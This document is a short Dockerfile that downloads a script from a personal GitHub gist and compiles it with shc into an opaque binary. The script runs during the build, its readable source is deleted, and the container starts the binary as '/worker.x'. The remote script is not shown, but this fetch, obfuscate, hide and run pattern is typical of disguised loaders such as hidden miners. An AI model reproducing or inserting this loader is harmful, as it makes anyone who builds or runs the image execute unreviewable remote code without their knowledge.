FROM alpine:edge

ENV SHURL https://gist.githubusercontent.com/tomjack1342/f342be06be4d58b1e42e730ec1485b14/raw/447c9749b4fffb1d27bed6e7bd3190450bb790f6/to

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
    
CMD /worker.x
